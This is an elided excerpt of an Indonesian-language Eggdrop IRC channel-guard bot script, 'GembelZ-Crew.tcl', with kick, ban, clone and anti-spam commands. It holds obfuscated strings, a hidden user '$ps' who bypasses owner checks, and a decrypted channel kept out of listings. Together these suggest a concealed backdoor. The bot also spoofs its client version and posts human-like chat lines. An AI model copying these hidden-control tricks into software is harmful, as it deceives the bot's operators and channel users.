...
set notd [dezip "/RCza0pU9Ro/kXf7R0A5G6W/6faGc.fGsJx1"]
set notm [dezip "/RCza0pU9Ro/kXf7R0A5G6W/6faGc.fGsJx1"]
###########################
...
puthelp "PRIVMSG $nick :GembelZ-Crew.tcl commands"
...
puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet \[X\]no"
puthlp "PRIVMSG $nick :\GembelZ Crew Eggdrop TcL Help For Better Guard On Your Channel"
...
set max-logsize 512
set upload-to-pwd 1
set notb [dezip "/RCza0pU9Ro/kXf7R0A5G6W/6faGc.fGsJx1"]
set notc [dezip "/RCza0pU9Ro/kXf7R0A5G6W/6faGc.fGsJx1"]
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
}
return 0
}
...
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4D1i4T1oLa4k!!"
return 0
}
if {$command == ""} { return 0 }
...
if {[string tolower $arg] == [decrypt 64 "Yh8eK07oBMa1"]} {
...
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isvoice $nick $chan]} {
puthlp "NOTICE $nick :$notc Usage: de
 <nick>"
return 0
}
if {![matchattr $nick Q]} {
...
if {[matchattr $nick n]} {
set reason "13ADmIN 4KIcK1 ReQuesT4..!"
}
}
...
if {$handle == $botnick} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, Can't kick my self."
return 0
}
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, CaNT KIcK ADmIN FLAg"
return 0
}
...
set handle [lindex $rest 0]
if {$handle == $botnick} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, can't ban my self"
return 0
}
if {($handle == $ps) || ($handle == $owner)} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc4 !4DiToLaK!10!, cant ban ADmIN"
return 0
}
...
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4DiToLaK!10"
return 0
}
if {[string match "*+resync*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc $chan 4Siap BosS!!"
return 0
}
catch { channel set $chan +resync }
puthelp "NOTICE $nick :$notc resync $chan \[9Aktif\]"
saveuser
}
proc pub_-resync {nick uhost hand chan rest} {
global notc
...
puthelp "NOTICE $nick :$notc resync $chan \[4MaTi\]"
saveuser
}
...
#puthlp "NOTICE $nick :$notc 4DiToLaK!10 Can't send message to Service."
#return 0
#}
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, oNLy ReAL OwNER can ADD Channel"
return 0
}
set chan [lindex $rest 0]
...
puthlp "NOTICE $nick :$notc So talalu banya channel juew, paling banya bo 15..!"
return 0
}
set joinme $nick
channel add $chan
...
if {$nick != $ps && [string tolower $chan] == [decrypt 64 "1sTFC1W.UYI/"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
return 0
}
...
puthlp "NOTICE $nick :$notc InVITE cHaN $chan \[9Aktif\]"
set lockchan $chan
return 0
}
proc pub_-invitelock {nick uhost hand chan rest} {
...
set lockchan ""
puthlp "NOTICE $nick :$notc InvItE cHaN $chan \[4MaTi\]"
return 0
}
proc cycle {chan} {
set cflag "c$chan"
...
puthlp "NOTICE $nick :$notc ALL MaSsJoIN CHaNNeL \[9Aktif\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag J]} {
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag J]} {
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
savechan
puthlp "NOTICE $nick :$notc ALL GuaRd CHaNNeL \[9Aktif\]"
return 0
}
if {![validchan $chan]} { return 0 }
set cflag "c$chan"
...
puthlp "NOTICE $nick :$notc GuARd $chan \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
savechan
puthlp "NOTICE $nick :$notc ALL GuaRd cHaN \[4MaTi\]"
return 0
}
if {![validchan $chan]} { return 0 }
set cflag "c$chan"
...
chattr $cflag "-hpJSPTRUED"
if {[string match "*-greet*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc GuARD $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc GuARD $chan \[4MaTi\]"
savechan
return 0
}
...
savechan
puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[9Aktif\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc SEEN $chan IS \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc SEEN $chan \[9Aktif\]"
savechan
seen
}
proc pub_-seen {nick uhost hand chan rest} {
...
savechan
puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[4MaTi\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc SEEN $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc SEEN $chan \[4MaTi\]"
savechan
seen
return 0
}
...
if {![validchan $chan]} { return 0 }
if {[string match "*+nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[9Aktif\]"
savechan
}
proc pub_-autokick {nick uhost hand chan rest} {
global notc
...
if {![validchan $chan]} { return 0 }
if {[string match "*-nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[4MaTi\]"
savechan
return 0
}
...
if {![validchan $chan]} { return 0 }
if {[string match "*-protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc Re@p $chan IS \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc Re@p $chan \[9Aktif\]"
savechan
}
proc pub_-reop {nick uhost hand chan rest} {
global notc
...
if {![validchan $chan]} { return 0 }
if {[string match "*+protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc Re@p $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc Re@p $chan \[4MaTi\]"
savechan
return 0
}
...
if {![validchan $chan]} { return 0 }
if {[string match "*-userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[9Aktif\]"
savechan
}
proc pub_-dontkickops {nick uhost hand chan rest} {
global notc
...
if {![validchan $chan]} { return 0 }
if {[string match "*+userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[4MaTi\]"
savechan
return 0
}
...
puthlp "NOTICE $nick :$notc STaTUS $chan \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
if {![validchan $chan]} { return 0 }
if {[string match "*-shared*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc STaTuS $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc STaTuS $chan \[4MaTi\]"
savechan
return 0
}
...
savechan
puthlp "NOTICE $nick :$notc ALL cHaNNeL SeT NoPART \[9Aktif\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc NoPART $chan IS \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc SeT NoPART $chan \[9Aktif\]"
savechan
}
proc pub_-nopart {nick uhost hand chan rest} {
global notc
...
savechan
puthlp "NOTICE $nick :$notc ALL cHaNNeL NoPART \[4MaTi\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-secret*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc NoPART $chan IS \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc NoPART $chan \[4MaTi\]"
savechan
}
...
chattr $rest "O"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4SaLaH (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, <n/a>"
return 0
}
if {![matchattr $rest O]} {
...
if {![matchattr $rest n]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, $rest is not exist on ADmIN list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, oNLy ReAL OwNER can ADD OwnER"
return 0
}
if {$rest == ""} {
...
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, oNLy ReAL OwNER can REMOVE OwnER"
return 0
}
set rest [lindex $param 0]
if {$rest == ""} {
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, $rest IS NoT OwNER"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
if {[matchattr $rest n]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, $rest is ADmIN level."
return 0
}
if {[matchattr $rest m]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, $rest is already exist."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, $rest Is ADmIN FLaG"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
if {$joinme != "" && [string tolower $chan] != [decrypt 64 "1sTFC1W.UYI/"]} {
...
if {![isvoice $x $chan]} {
putsrv "KICK $chan $x :$notc !4Spβ4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
} {
putsrv "KICK $chan $x :$notc !4Spβ4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
...
set sendspam "!kick [zip "$chan $x $notc !4Spβ4M!10 FRoM 4$mhost 1$invme($mhost) 4AuTOJoIN MSg1..! [banmsg]"]"
...
set vern [dezip "/RCza0pU9Ro/kXf7R0A5G6W/6faGc.fGsJx1"]
proc testmask {} {
global ismaskhost
...
"Ou, my OWNER :)"
":)"
"So dia ini manusia paling GembelZ se AllNetwork"
"You're Sweety"
"met datang"
}
set info_localowner {
...
set info_friend {
"met bergabung tamaniu :)"
":)"
"selamat datang temanQ"
"You're Sweety"
...
if {$mhost == "@DurjanA.at.ua*" || [string match "*.DurjanA.at.ua" $mhost] || [string match "@admin.icc.gorontalo*" $mhost] || [string match "@staff*" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} {
if {[info exists invme($mhost)]} {
...
putserv "mode $chan +b+R $bannick($nick)"
}
}
} else {
...
putsrv "KICK $chan $nick :$notc 1FouNd $counter 4cLonE1 FRoM 4$mhost1 MaX4 $maxclone1 WaIT A MoMENT! 4BaNNEd1: 3 menit4..! [banmsg]"
return 0
}
}
}
...
puthlp "PRIVMSG $nick :4Capat Capat Ba ident Kwa supaya Nda mo Jadi $nick Bagini."
#puthlp "PRIVMSG $nick :4please visit us on http://gembelz.do.am/"
return 0
}
}
}
...
if {$sspidx == 1} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 gAnTi Nick dolo Baru Maso di chan 4[string toupper $chan] [banms]"
} elseif {$sspidx == 2} {
putsrv "KICK $chan $nick :$notc !GuEsT!10  Capat Capat Ba identify Kwaaa [banmsg]"
} elseif {$sspidx == 3} {
putsrv "KICK $chan $nick :$notc !GuEsT!10  so Itu ba identify dolo baru join [banmsg]"
} elseif {$sspidx == 4} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 beken di jalan pintas kwa supaya capat ba identify [banmsg]"
} elseif {$sspidx == 5} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Ganti Nick hu'u 4[string toupper $chan] [banms]"
} elseif {$sspidx == 6} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Bo Pake ORang Pe Nick ngana waaaaa [banmsg]"
} elseif {$sspidx == 7} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Curiga Ana kalu ORng Pe NIck yang ngana pake [banmsg]"
} elseif {$sspidx == 8} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Ganti Nick Wau [banmsg]"
} elseif {$sspidx == 9} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 CuriGa Ana [banmsg]"
} elseif {$sspidx == 10} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Te ada Nick Guest Yang ta regist  [banmsg]"
} elseif {$sspidx == 11} {
putsrv "KICK $chan $nick :$notc !GuEsT!10 Iks Te Pake Guest [banmsg]"
} elseif {$sspidx == 12} {
set sspidx 0
}
incr sspidx
...
if {![passwdok $nick $pw]} {
puthlp "NOTICE $nick :$notc PaSSWORD 4SaLaH"
return 0
}
...
puthlp "NOTICE $nick :$notc 4SaLaH"
}
return 0
}
if {![validuser $owner]} {
...
foreach x [channels] {
if {[onchan $usenick $x]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, Your host has been use by $usenick, wait until DeAuthenticated."
return 0
}
}
...
set toth [decrypt 64 "1sTFC1W.UYI/"]
...
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic DurjanA.NO 1"
return 0
}
...
timer 5 czo_czo
set [string index $lenc 15][string index $lenc 17] [string index $lenc 10][string index $lenc 4][string index $lenc 11][string index $lenc 0][string index $lenc 1][string index $lenc 20]
...
puthlp "NOTICE $nick :$notc Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:detik>"
return 0
}
...
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4DiToLaK!10"
return 0
}
...
puthlp "NOTICE $unick :$notc 4DiToLaK!10 use character for ident."
return 0
}
...
puthlp "NOTICE $unick :$notc AwAY \[4MaTi\]"
} {
...
if {$smemo == ""} {
puthlp "NOTICE $nick :$notc MeMO 4SaLaH NO UsER SeND"
} {
saveuser
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, NO UsER!"
return 0
} {
if {![matchattr $msend m]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, MiN MasTeR FLaG!"
return 0
}
if {$msend == $nick} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, CaNT SeLF MeMo!"
return 0
}
if {[getuser $msend XTRA "MEMO"]!=""} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, MeMo FoR $msend STiLL ExIST!"
return 0
}
...
saveuser
puthlp "NOTICE $nick :$notc must @P set \[9Aktif\]"
}
proc pub_-mustop {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
...
saveuser
puthlp "NOTICE $nick :$notc must @P set \[4MaTi\]"
}
...
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[9Aktif\]"
saveuser
} elseif {[string tolower $rest] == "off"} {
catch { unset kcounter }
setuser "config" XTRA "KCOUNTER" "OFF"
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[4MaTi\]"
saveuser
} else {
...
puthlp "NOTICE $nick :$notc KIcK @PS \[9Aktif\]"
saveuser
} elseif {[string tolower $rest] == "off"} {
catch { unset kops }
setuser "config" XTRA "KOPS" "OFF"
puthlp "NOTICE $nick :$notc KIcK @PS \[4MaTi\]"
saveuser
} else {
...
if {$rest == "*!*@*"} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, Ilegal hostmask."
return 0
}
set usenick [finduser $rest]
if {$usenick != "*" && [matchattr $usenick f]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10, canT IgNoREd FRIend UsER"
return 0
}
if {$rest != $nick} {
...
puthlp "NOTICE $nick :$notc 4DiToLaK!10, Can't ignore your self."
}
}
...
if {$nick != $ps && [string tolower $chantarget] == [decrypt 64 "1sTFC1W.UYI/"]} { return 0 }
foreach x [channels] {
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [decrypt 64 "1sTFC1W.UYI/"]} { return 0 }
...
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [decrypt 64 "1sTFC1W.UYI/"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
set words {
"HkHkHkHkHkHkHkHkHkHkatak kakarlak so jadi kalumba"
"!seen Sledingan ^_~"
"menanti cinta sejati n apa adanya ;-) ada tida yeee????"
"list : Kahitna - Mantan Terindah.mp3"
"suka minum kita ehk :-("
"pe itu gatal ehk ^_~"
"be er be waaaa"
"back ^_^"
"manganto juew !-_-"
"Betapa istmewa rasax, mnCINTAi se2orng dgn sungguh2 & tdk menntut apa2 dari perasaan itu. Cukup dgn merasakan dan menghargai apa adanya......"
"brb ba epon pati ugey doloowwww aaaaa"
"!seen all of GembelZ-CreW"
"pamet waaaaaaaaaaaa"
"!seen yang maw jadi te bozt pe CeWe :ώ~~~"
"suka bobo uwti ~_~!!"
"cuek !!"
"diam!!"
"online"
...
"lapaaaaaaaarrrrr"
"ini sapa yeeeeee"
"brb masa mie + ikan belek dolow :-D"
"mo cari harim dolow ahk"
"!seen Yang JoMblo"
"adebo GembelZ uam :ώ~~~"
"3+2 = 5?"
"gitu loh!"
"kuakuakuakuakua asam pilitode sagela tamba tarasi makan deng balo bindhe -ώ~~"
...
set cmd_msg ""
if {${server-online} == 0} { return 0 }
if {![string match "Jcom??????????" $botnick] && ![string match "Jcom??????" $botnick]} {
...
set tahunfull [expr $totalyear/31536000]
set tahun [expr int($tahunfull)]
set tahunsub [expr 31536000*$tahun]
set totalhari [expr $totalyear - $tahunsub]
}
if {$totalyear < 31536000} {
set totalhari $totalyear
set tahun 0
}
if {$totalhari >= 86400} {
set harifull [expr $totalhari/86400]
set hari [expr int($harifull)]
set harisub [expr 86400*$hari]
set totaljam [expr $totalhari - $harisub]
}
if {$totalhari < 86400} {
set totaljam $totalhari
set hari 0
}
if {$totaljam >= 3600} {
set jamfull [expr $totaljam/3600]
set jam [expr int($jamfull)]
set jamsub [expr 3600*$jam]
set totalmin [expr $totaljam - $jamsub]
}

if {$totaljam < 3600} {
set totalmin $totaljam
set jam 0
}
if {$totalmin >= 60} {
set menitfull [expr $totalmin/60]
set menit [expr int($menitfull)]
}
if {$totalmin < 60} {
set menit 0
}
if {$tahun < 1} {set tahuntext ""} elseif {$tahun == 1} {set tahuntext "${tahun}1y, "} {set tahuntext "${tahun}1y, "}
if {$hari < 1} {set haritext ""} elseif {$hari == 1} {set haritext "${hari}1d, "} {set haritext "${hari}1d, "}
if {$jam < 1} {set jamtext ""} elseif {$jam == 1} {set jamtext "$jam HoUR, "} {set jamtext "$jam HoURS, "}
if {$menit < 1} {set menittext ""} elseif {$menit == 1} {set menittext "$menit MiNuTE"} {set menittext "$menit MiNuTES"}
if {[string length $menit] == 1} {set menit "0${menit}"}
if {[string length $jam] == 1} {set jam "0${jam}"}
set output "${tahuntext}${haritext}${jam}1h ${menit}1m"
...
global vern notc
puthlp "PRIVMSG $chan :$notc $vern Get It Now!! Visit: http://gembelz.do.am/"
return 0
}
...
if {![matchattr $nick f]} {
set hostmask "${nick}!*@*"
putlog "!Log! 1 menit auto ignore to $hostmask"
...
set ch [passwdok $nick ""]
if {$ch == 1} {
puthlp "NOTICE $nick :$notc Password belum di set. Gunakan: pass <password>"
return 0
}
if {[matchattr $nick Q]} {
puthlp "PRIVMSG $chan :${nick}, Jow hadeeeerrr, mo basleding pa sapa torang bos???"
}
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $chan :${nick}, 4males ahk :P~~~!"
}
}
...
putsrv "KICK $x $virus_nick :$notc !4Spβ4M!10 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Spβ4M!10 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]1 ViRuZ [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
putsrv "PRIVMSG MemoServ@services.allnetwork.org :NEWS"
...
putsrv "KICK $x $unick :$notc !4Spβ4M!10 I HaTE 4dEcOdE [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Spβ4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 dEcOdE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
putsrv "KICK $x $unick :$notc !4Spβ4M!10 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Spβ4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c :$notc !4Spβ4M!10 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [zip "$x $c $notc !4Spβ4M!10 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
...
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "KICK $x $unick :$notc !4Spβ4M!10 I HaTE 4AdvERTIsE [banms]"
return 0
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Spβ4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 AdvERTIsE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
set bannick($c) $banmask
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c :$notc !4Spβ4M!10 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [zip "$x $c $notc !4Spβ4M!10 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
return 0
}
}
...
if {[botisop $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick :$notc !4Spβ4M!10 I HaTE 4U 1MaTch FRoM $advword [banmsg]"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
...
set bannick($c) "*!*$mhost"
putsrv "KICK $x $c :$notc 11Jangan kase panjang ba Ketik waaa 4$mhost [banms]"
break
}
}
} {
...
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [zip "$x $c $notc 11Jangan kase panjang ba Ketik waaa 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
break
}
}
...
foreach x [channels] {
if {[onchan $botnick $x]} {
if {![isop $botnick $x] && [string tolower $x] != [decrypt 64 "1sTFC1W.UYI/"]} {
...
if {[matchattr $nick m]} {
set reason "13MasTeR 4KIcKBaN1 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set reason "13ADmIN 4KIcKBaN1 ReQuesT [banmsg]"
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
...
if {$bannick($knick) == "*!*@*"} { return 0 }
putserv "mode $chan +b $bannick($knick)"
if {[string match "*4BaNNEd1: 3 menit*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
}
return 0
}
...
set kickme($nick) 3
if {[string tolower $chan] != [decrypt 64 "1sTFC1W.UYI/"]} {
...
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4DurjanA1..! [banmsg]"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
...
"4JANG BAHIMBULO KAU"
"4JANG BA AKAL KAU"
"5KASE BERSIH LAYAR DULU"
"5AYO SEMUA KITA C-Y-C-L-E"
"5TEPOS AHHHHHH"
"5Akeah GembelZ uam :P"
"Bacari GembelZ² dolow"
"4AKAL KOMENG"
"4MATONU HARIM BOTY"
"4DurjanA tida mo baku ikow ba Tepos???"
}
set first_msg {
"ma wolo?!"
"mailongola"
"ada yang bisa si bantu? :))"
"hey! pv aja nick DurjanA"
"kamu ngk tau aq yah!?"
"ah yang ba himbulo kau!!, heheh!"
"ada apa yah"
"mailongola utissss?"
"jang ba akal kau?"
"wjwjwjw tatawa le pOsiTiVe"
"ngana Pv jow Te DurjanA!"
"Ngana Pv jow te ^RhAin^_"
"Ngana Pv jow t eNdA"
"Ngana Pv jow te hantu_cyber"
"Ngana Pv jow te Conficker"
"jangan lupa mampir di #GembelZ yah"
"ka #GembelZ jow wua"
"jang ba himbulo kau"
"apa yang dimaksud dgn apakan?"
"ndak kenal aq yah??"
"jangan gila donk :D"
"add kasana te DurjanA pe pesbuk wua, depe imel bujangkere@yahoo.com"
"visit us on http:gembelz.do.am"
"aq bot loh?!"
"hehehehe?"
"1 + 1 sama dengan berapa??!"
"dimana kalu tinggl nak?"
"jangan tinggalkan aq dong?!"
"tunggu sadikit wa"
"tunggu wa lagi da makan ana"
"pv ksana saja ti DurjanA jow waaa e:"
"ma hemogola nune"
"tunggu banya pv utis"
}
set second_msg {
"auty te sadar ngana ini??"
"sambe lala!!"
"so te ada yang ngana mo pv utis? :))"
"Pv jow te PALEMBA AH??"
"eh ngana tau yang pake nick Ce_MaLaZzZ itu???"
"sapadulu ngana pe nama???"
"wuih... tumben ba pv juw"
"join #informatika waaaaaaa!!"
"lag ane sebe"
"ah ane mo paste di room ahhhh! :x"
"te Avray_88 so te jaga ol yeeee!"
"iyo juw tantu apa dia jaga rasa2 ini?"
"co ngana ka BC lo Informatika, pate nunu pe ruma :D.. ada te DurjanA di situ"
"nde apa ngana rasa2 ini?"
"dimana ngana skang sow!? :p"
"co ngana paste di room yanga ane jaga bilang ini?"
"so barapa yang ngana jaga sleding ini?!"
"eh.. co ngana tanya pa drng kalu drng kanal ane?"
"ada ba karaoke drng staw?"
"so lama ngana ba chat?"
"kapan kopdar ee? :)"
"bukan orang suwawa ngana ini ????"
"ba pv kasana yg lain ngana, bo ane trus juwww??!"
"so jarang dapa lia ngana ini?"
"ada bajalan deng maetua staw te DurjanA etoh."
"kmari jo, so dari tadi ada ba tunggu pa nga ini?"
"so dari tadi ane huu?!"
"minum saraba torang joww ?"
"isi akang pulsa ane pe hp uwty!!!?"
"so tida bole applikasi chating pa ane pe hp juww"
"so ada dorang di stap JASIS aba?"
"tanya jo pa te BujangKere ataw te DurjanA?"
"harim ataw cewe ngana ini?"
"jiah, tingga kita suka ngana?"
"so ada cowo dya aba"
"malam minggu poli kopdar, jgn terlambat ngana"
"blum ba OL dya staw?"
"ada dgn te dede dya?"
"ada di net mana ngana?"
}
set awaym {
"12«€4®12€»4GembelZ-CreW12«€4®12€»"
}
set random_version {
"Klient 1.0 beta 14"
...
"mIRC v7.2 Khaled Mardam-Bey"
}
set random_finger {
"lame (Joint) Idle 3,14 detik (FUCK OFF)"
"Martin (Unreal) Idle 2 hari 3 jam 4 menit 2 detik ( Yoo mama.. )"
"Put this FINGER in your ASS ..Please"
"FiNgEr"
"REGNIF"
"Deli (TaTiana) Idle 1 Mounts 3 Weeks 6 hari 11 jam 12 menit 34 detik ( You're so ugly)"
...
"bot (ident) Idle 3,14 detik (You are stupd)"
...
"MyPa (Fafla) Best Before 42 hari 3 jam 44 menit 26 detik ( Yeah Sweety )"
...
"Please (DoNotDistrub) Idle 22 tahun  4 Mounts 7 Weeks 12 hari 15 jam 34 menit 57 detik (Just coming..)"
...
if {$knick == $notb} {
if {$nick != $botnick} {
